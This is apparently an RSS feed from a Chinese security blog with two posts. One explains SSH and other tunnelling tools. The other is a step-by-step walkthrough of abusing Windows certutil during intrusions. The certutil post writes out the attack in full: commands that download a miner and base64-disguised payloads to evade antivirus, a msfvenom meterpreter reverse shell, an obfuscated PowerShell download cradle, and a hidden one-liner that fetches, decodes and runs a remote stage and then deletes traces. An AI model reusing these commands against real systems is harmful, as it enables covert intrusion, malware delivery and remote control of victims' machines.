<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>横向移动 on 清夜无尘の一方天地</title>
    <link>https://wander1ng.com/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</link>
    <description>Recent content in 横向移动 on 清夜无尘の一方天地</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>cn</language>
    <copyright>Copyright © 2019–2024</copyright>
    <lastBuildDate>Thu, 14 Nov 2024 16:06:31 +0800</lastBuildDate>
    
	<atom:link href="https://wander1ng.com/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Certutil在渗透中的使用</title>
      <link>https://wander1ng.com/post/certutil%E5%9C%A8%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Thu, 14 Nov 2024 16:06:31 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/certutil%E5%9C%A8%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/</guid>
      <description>&lt;p&gt;CertUtil是一个Windows的内置程序，用于管理Windows中的证书，使用此程序，可以在Windows中安装，备份，删除，管理和执行与证书和证书存储相关的各种功能。&lt;/p&gt;
&lt;p&gt;经典用法是处理Base64编码的数据：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\Windows\Temp&amp;gt; certutil.exe -decode input.txt output.exe
//-decode参数用于将编码的文件解码为其原始的二进制形式
//第一二个必选参数分别为输入文件名、输出文件名
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;也能够从远程URL下载证书或者任何其它文件&lt;/p&gt;
&lt;p&gt;语法： “certutil.exe -urlcache -split -f [URL] output.file”&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;certutil.exe -urlcache -split -f http://37.44.212.223/miner.exe C:/Windows/temp/yete.exe
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;-f&lt;/code&gt; 覆盖现有文件。有值的命令行选项。后面跟要下载的文件 url。•&lt;code&gt;-split&lt;/code&gt; 保存到文件。无值的命令行选项。加了的话就可以下载到当前路径，不加就下载到了默认路径。•&lt;code&gt;-URLCache&lt;/code&gt; 显示或删除URL缓存条目。无值的命令行选项。（certutil.exe 下载有个弊端，它的每一次下载都有留有缓存。）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;两种功能进行结合：首先对恶意文件进行base64编码，以绕过AV检测， 然后在使用CertUtil.exe下载后再对其进行解码。&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\Windows\Temp&amp;gt;certutil.exe -urlcache -split -f &amp;#34;https://hackers.home/badcontent.txt&amp;#34; bad.txt
C:\Windows\Temp&amp;gt;certutil.exe -decode bad.txt bad.exe
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;攻击者为什么喜欢用CertUtil？因为它是Windows内置的程序，CertUtil可能会被列入白名单。其实利用合法的Windows植入恶意软件非常常见，比如Windows regsvr32.exe就是以类似的方式使用。&lt;/p&gt;
&lt;p&gt;使用Certutil.exe下载文件，下载完成以后一定记得delete 清理痕迹。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\&amp;gt; certutil.exe -urlcache -split -f http://lyshark.com/lyshark.log
C:\&amp;gt; certutil.exe -urlcache -split -f http://lyshark.com/lyshark.log delete
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;还可以用来校验hash值，这个之前使用过&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;certutil -hashfile mimikatz.exe MD5    //检验MD5certutil -hashfile mimikatz.exe SHA1 //检验SHA1certutil -hashfile mimikatz.exe SHA256 //检验SHA256
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Certutil命令配合PS反弹后门&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;PowerShell 混淆框架：https://github.com/danielbohannon/Invoke-CradleCrafter&lt;/p&gt;
&lt;p&gt;1.在加载PowerShell脚本之前，先来进行数字签名，运行命令。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PS C:\Invoke-CradleCrafter&amp;gt; Set-ExecutionPolicy Bypass
执行策略更改
执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=135170
中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略? Y
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.使用方法，执行两条命令，加载框架。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PS C:\Invoke-CradleCrafter&amp;gt; Import-Module .\Invoke-CradleCrafter.ps1
PS C:\Invoke-CradleCrafter&amp;gt; Invoke-CradleCrafter

Invoke-CradleCrafter

          _____                 _                    ,
          \_   \_ ____   _____ | | _____           /(  __________
           / /\/ &amp;#39;_ \ \ / / _ \| |/ / _ \_____    |  &amp;gt;:==========`
        /\/ /_ | | | \ V / (_) |   &amp;lt;  __/_____|    )(
        \____/ |_| |_|\_/ \___/|_|\_\___|          &amp;#34;&amp;#34;
           ___              _ _        ___           __ _
          / __\ __ __ _  __| | | ___  / __\ __ __ _ / _| |_ ___ _ __
         / / | &amp;#39;__/ _` |/ _` | |/ _ \/ / | &amp;#39;__/ _` | |_| __/ _ \ &amp;#39;__|
        / /__| | | (_| | (_| | |  __/ /__| | | (_| |  _| ||  __/ |
        \____/_|  \__,_|\__,_|_|\___\____/_|  \__,_|_|  \__\___|_|

        Tool    :: Invoke-CradleCrafter
        Author  :: Daniel Bohannon (DBO)
        Twitter :: @danielhbohannon
        Blog    :: http://danielbohannon.com
        Github  :: https://github.com/danielbohannon/Invoke-CradleCrafter
        Version :: 1.1
        License :: Apache License, Version 2.0
        Notes   :: If(!$Caffeinated) {Exit}

HELP MENU :: Available options shown below:
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.MSF攻击主机，生成payload，并将生成好的payload放入网站根目录，保证能够正常访问。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[root@localhost ~]# msfvenom -p windows/x64/meterpreter/reverse_tcp \
&amp;gt; lhost=192.168.1.30 lport=8888 -e cmd/powershell_base64 \
&amp;gt; -f psh -o lyshark.txt

[root@localhost ~]# cp -a lyshark.txt  /var/www/html/
[root@localhost ~]# systemctl restart httpd
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;4.powershell 框架设置指定好的URL链接。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Invoke-CradleCrafter&amp;gt;  set URL http://lyshark.com/lyshark.txt

Successfully set Url:
http://lyshark.com/lyshark.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;5.分别执行以下命令完成初始化，这里如果报错请添加环境变量。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Invoke-CradleCrafter&amp;gt; MEMORY

Choose one of the below Memory options:

[*] MEMORY\PSWEBSTRING          PS Net.WebClient + DownloadString method
[*] MEMORY\PSWEBDATA            PS Net.WebClient + DownloadData method
[*] MEMORY\PSWEBOPENREAD        PS Net.WebClient + OpenRead method
[*] MEMORY\NETWEBSTRING         .NET [Net.WebClient] + DownloadString method (PS3.0+)
[*] MEMORY\NETWEBDATA           .NET [Net.WebClient] + DownloadData method (PS3.0+)
[*] MEMORY\NETWEBOPENREAD       .NET [Net.WebClient] + OpenRead method (PS3.0+)
[*] MEMORY\PSWEBREQUEST         PS Invoke-WebRequest/IWR (PS3.0+)
[*] MEMORY\PSRESTMETHOD         PS Invoke-RestMethod/IRM (PS3.0+)
[*] MEMORY\NETWEBREQUEST        .NET [Net.HttpWebRequest] class
[*] MEMORY\PSSENDKEYS           PS SendKeys class + Notepad (for the lulz)
[*] MEMORY\PSCOMWORD            PS COM object + WinWord.exe
[*] MEMORY\PSCOMEXCEL           PS COM object + Excel.exe
[*] MEMORY\PSCOMIE              PS COM object + Iexplore.exe
[*] MEMORY\PSCOMMSXML           PS COM object + MsXml2.ServerXmlHttp
[*] MEMORY\PSINLINECSHARP       PS Add-Type + Inline CSharp
[*] MEMORY\PSCOMPILEDCSHARP     .NET [Reflection.Assembly]::Load Pre-Compiled CSharp
[*] MEMORY\CERTUTIL             Certutil.exe + -ping Argument
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Invoke-CradleCrafter\Memory&amp;gt; CERTUTIL

[*] Name          :: Certutil
[*] Description   :: PowerShell leveraging certutil.exe to download payload as string
[*] Compatibility :: PS 2.0+
[*] Dependencies  :: Certutil.exe
[*] Footprint     :: Entirely memory-based
[*] Indicators    :: powershell.exe spawns certutil.exe certutil.exe 
[*] Artifacts     :: C:\Windows\Prefetch\CERTUTIL.EXE-********.pf AppCompat Cache
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Invoke-CradleCrafter\Memory\Certutil&amp;gt; ALL


Choose one of the below Memory\Certutil\All options to APPLY to current cradle:

[*] MEMORY\CERTUTIL\ALL\1       Execute ALL Token obfuscation techniques (random order)


Invoke-CradleCrafter\Memory\Certutil\All&amp;gt; 1

Executed:
  CLI:  Memory\Certutil\All\1
  FULL: Out-Cradle -Url &amp;#39;http://lyshark.com/lyshark.txt&amp;#39; -Cradle 17 -TokenArray @(&amp;#39;All&amp;#39;,1)

Result:
SV 1O6 &amp;#39;http://lyshark.com/lyshark.txt&amp;#39;;.(Get-Command *ke-*pr*) ((C:\Windows\System32\certutil /ping (Get-Item Variable:\1O6).Value|&amp;amp;(Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand.PsObject.Methods|?{(Get-Variable _ -ValueOn).Name-ilike&amp;#39;*and&amp;#39;}).Name).Invoke((Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand|GM|?{(Get-Variable _ -ValueOn).Name-ilike&amp;#39;*Com*e&amp;#39;}).Name).Invoke(&amp;#39;*el*-O*&amp;#39;,$TRUE,1),[Management.Automation.CommandTypes]::Cmdlet)-Skip 2|&amp;amp;(Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand.PsObject.Methods|?{(Get-Variable _ -ValueOn).Name-ilike&amp;#39;*and&amp;#39;}).Name).Invoke((Get-Variable Ex*xt).Value.InvokeCommand.(((Get-Variable Ex*xt).Value.InvokeCommand|GM|?{(Get-Variable _ -ValueOn).Name-ilike&amp;#39;*Com*e&amp;#39;}).Name).Invoke(&amp;#39;*el*-O*&amp;#39;,$TRUE,1),[Management.Automation.CommandTypes]::Cmdlet)-SkipLa 1)-Join&amp;#34;`r`n&amp;#34;)

Choose one of the below Memory\Certutil\All options to APPLY to current cradle:

[*] MEMORY\CERTUTIL\ALL\1       Execute ALL Token obfuscation techniques (random order)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;6.将上方混淆后的内容保存为 crt.txt 然后进行encode加密&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\Users\lyshark\Desktop&amp;gt;certutil -encode crt.txt crt.cer

输入长度 = 912
输出长度 = 1310
CertUtil: -encode 命令成功完成。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;7.将生成的 crt.cer放入服务器的根目录下，保证能够访问，然后运行msfconsole控制台，并侦听事件。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[root@localhost ~]# cp -a crt.cer /var/www/html/

msf5 &amp;gt; use exploit/multi/handler
msf5 exploit(multi/handler) &amp;gt; set payload windows/meterpreter/reverse_tcp
payload =&amp;gt; windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) &amp;gt; set lhost 192.168.1.30
lhost =&amp;gt; 192.168.1.7
msf5 exploit(multi/handler) &amp;gt; set lport 8888
lport =&amp;gt; 8888
msf5 exploit(multi/handler) &amp;gt; exploit -j -z
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;8.最终靶机执行，以下命令。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;powershell.exe ‐Win hiddeN ‐Exec ByPasS add‐content ‐path %APPDATA%\crt.cer (New‐Object Net.WebClient).DownloadString(&amp;#39;http://lyshark.com/crt.cer&amp;#39;); certutil ‐decode %APPDATA%\crt.cer %APPDATA%\stage.ps1 &amp;amp; start /b c
md /c powershell.exe ‐Exec Bypass ‐NoExit ‐File %APPDATA%\stage.ps1 &amp;amp; start /b cmd /c del %APPDATA%\crt.cer
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这种情况下powershell脚本不会落地&lt;/p&gt;
&lt;p&gt;没想到一个校验证书的程序能有这么多的功能&amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;参考：&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://cloud.tencent.com/developer/article/1850744&#34;&gt;干货 | Certutil在渗透中的利用和详解&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;(https://www.cnblogs.com/LyShark/p/10994300.html)&#34;&gt;certutil 命令配合PS反弹后门&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://wsygoogol.github.io/2018/12/17/%E6%94%BB%E5%87%BB%E8%80%85%E5%88%A9%E7%94%A8CertUtil-exe%E6%A4%8D%E5%85%A5%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/&#34;&gt;攻击者利用CertUtil.exe植入恶意软件&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>常见隧道工具实现</title>
      <link>https://wander1ng.com/post/%E5%B8%B8%E8%A7%81%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/</link>
      <pubDate>Wed, 07 Aug 2024 10:38:40 +0800</pubDate>
      
      <guid>https://wander1ng.com/post/%E5%B8%B8%E8%A7%81%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/</guid>
      <description>&lt;h4 id=&#34;chisel&#34;&gt;Chisel&lt;/h4&gt;
&lt;p&gt;项目地址：https://github.com/jpillora/chisel&lt;/p&gt;
&lt;p&gt;Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/f211df8890519ba2e5b50f7268f089117e5f754be9f759aa05617b92cc27d24a/68747470733a2f2f646f63732e676f6f676c652e636f6d2f64726177696e67732f642f317035335657787a474e667938726a722d6d5738707669734a6d686b6f4c6c383276416763744f5f366631772f7075623f773d39363026683d373230&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;gsocket&#34;&gt;gsocket&lt;/h4&gt;
&lt;p&gt;项目地址：https://github.com/hackerschoice/gsocket/tree/master&lt;/p&gt;
&lt;p&gt;The Global Socket Tookit allows two users behind NAT/Firewall to establish a TCP connection with each other. Securely.&lt;/p&gt;
&lt;p&gt;通信是通过gsocket分配密钥后，输入输出都传到官方服务器上实现的。&lt;/p&gt;
&lt;h4 id=&#34;ssh隧道&#34;&gt;SSH隧道&lt;/h4&gt;
&lt;p&gt;本地转发 - L&lt;/p&gt;
&lt;p&gt;本地转发里的本地，我认为最简单的理解就是执行转发命令后，后续实际用于连接的端口位于本地主机。 本地转发的基本命令形式如下：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh -L 主机A端口A:主机C:主机C端口C username@主机B&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;结合下面的示意图，我们来理解下这个命令。如果我们的电脑是主机A，主机B是服务器的登录节点，主机C是服务器的子节点，其中我们的主机A可以连接主机B，但不能直接访问主机C。这时如果我们想要在自己电脑上直接使用主机C上部署在端口C的服务，就可以使用上面的命令，将端口C转发到本地的端口A上。 这时，我们在本地其它程序访问A端口，就等于访问了主机C的端口C，就好像在A和C端口之间打了一条隧道直连一样。 另外主要注意的时，主机B可以和主机C是同一台电脑，我们只要把上面命令里的主机C改成localhost即可。一般用在我们只能访问B的部分端口的情况。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://note.msq.pub/202312190654146.webp&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/08/5763c4a58667798dfad28adac6664178.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;远程转发 - R&lt;/p&gt;
&lt;p&gt;远程转发里的远程，同样的理解方法，在执行转发命令后，后续实际用于连接的端口在远程主机。 远程转发的基本命令形式如下：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh -R 主机B端口B:主机C:主机C端口C username@主机B&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;同样结合示意图来进行理解。此时我们的主机A与主机C位于同一个内网，无法被直接访问，主机B位于公网可以直接访问。如果我们想要访问主机C端口C上的服务，可以在主机A上发起到主机B的ssh连接，执行如上命令。 这是，访问主机B的端口B，就等于访问主机C的端口C。同样的，主机A和主机C可以是同一台电脑，实现将内网机器提供的服务暴露到公网上。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://note.msq.pub/202312190730017.webp&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;动态转发 - D&lt;/p&gt;
&lt;p&gt;不同于上面的固定端口转发，动态转发相当于把主机B当做一台代理来使用，使用如下命令，可以在端口A上提供一个socks5代理服务。这样当我们在主机A的其它应用上设置了代理后，就可以通过主机B来访问网络，并且A和B之间的通信会被ssh加密。这也是最雏形的越过wall的方式。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh -D 主机A端口A username@主机B&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://note.msq.pub/202312191822341.webp&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;在执行上面的命令时，会同时打开一个ssh交互终端，如果我们只是需要后台启动隧道，可以添加- N参数。&lt;/p&gt;
&lt;h4 id=&#34;dns隧道&#34;&gt;DNS隧道&lt;/h4&gt;
&lt;h4 id=&#34;反向socket代理&#34;&gt;反向SOCKET代理&lt;/h4&gt;
</description>
    </item>
    
  </channel>
</rss>